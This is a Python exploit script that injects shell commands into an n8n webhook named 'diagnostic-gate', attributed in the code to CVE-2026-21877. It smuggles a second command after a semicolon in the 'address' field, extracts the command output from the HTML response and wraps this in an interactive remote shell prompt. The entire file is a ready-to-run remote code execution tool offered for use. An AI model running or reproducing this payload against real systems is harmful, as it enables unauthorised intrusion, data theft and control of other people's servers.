import requests
import sys
import html

def attack(target_ip, cmd, use_production=False):
    """
    Sends the malicious POST payload to the n8n webhook.
    
    Args:
        target_ip: The public IP of the GCP VM.
        cmd: The shell command to inject.
        use_production: If True, uses the persistent /webhook/ path.
                       If False, uses the one-time /webhook-test/ path.
    """
    path = "webhook" if use_production else "webhook-test"
    url = f"http://{target_ip}:5678/{path}/diagnostic-gate"
    
    # We use 2>/dev/null to suppress the 'ping: not found' error on the server side.
    # We also redirect stdout of the ping command just in case it exists, 
    # ensuring only our command's output is returned.
    payload = {"address": f"127.0.0.1 >/dev/null 2>&1 ; {cmd}"}
    headers = {"Content-Type": "application/json"}
    
    try:
        r = requests.post(url, json=payload, headers=headers, timeout=20)
        
        if r.status_code == 404:
            if not use_production:
                return "Error 404: Test Node not found. Ensure 'Execute Workflow' is active in n8n UI OR switch to Production Mode."
            else:
                return "Error 404: Production Webhook not found. Ensure the workflow is 'Active' (Toggle in top-right)."

        # Parse n8n response wrapper
        response_text = ""
        try:
            data = r.json()
            response_text = data.get("data", r.text)
        except:
            response_text = r.text

        if "<pre>" in response_text:
            output = response_text.split("<pre>")[1].split("</pre>")[0]
            output = html.unescape(output.strip())
            
            # Final client-side sanitization to remove the error string if it still persists
            error_msg = "/bin/sh: 1: ping: not found"
            if output.startswith(error_msg):
                output = output.replace(error_msg, "", 1).strip()
                
            return output
        else:
            return f"Command executed, but no output returned.\nStatus: {r.status_code}\nSnippet: {response_text[:200]}"
            
    except Exception as e:
        return f"Connection Error: {str(e)}"

def interactive_shell(target_ip):
    print(f"--- Persistent Shell via CVE-2026-21877 ---")
    print(f"Target: {target_ip}")
    
    mode_choice = input("Use Production Mode? (Workflow must be set to 'Active') [y/N]: ").lower()
    is_prod = mode_choice == 'y'
    
    if is_prod:
        print("[!] Using Production Path (/webhook/). Ensure the toggle in n8n is ON.")
    else:
        print("[!] Using Test Path (/webhook-test/). You must click 'Execute' for every command.")

    print("Type 'exit' to quit.\n")
    
    while True:
        try:
            cmd = input("rce_shell$ ")
            if cmd.lower() in ["exit", "quit"]: break
            if not cmd.strip(): continue
            
            result = attack(target_ip, cmd, use_production=is_prod)
            print(result)
            
        except KeyboardInterrupt:
            print("\nExiting...")
            break

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 exploit_n8n.py <TARGET_IP>")
        sys.exit(1)
        
    target_ip = sys.argv[1]
    interactive_shell(target_ip)
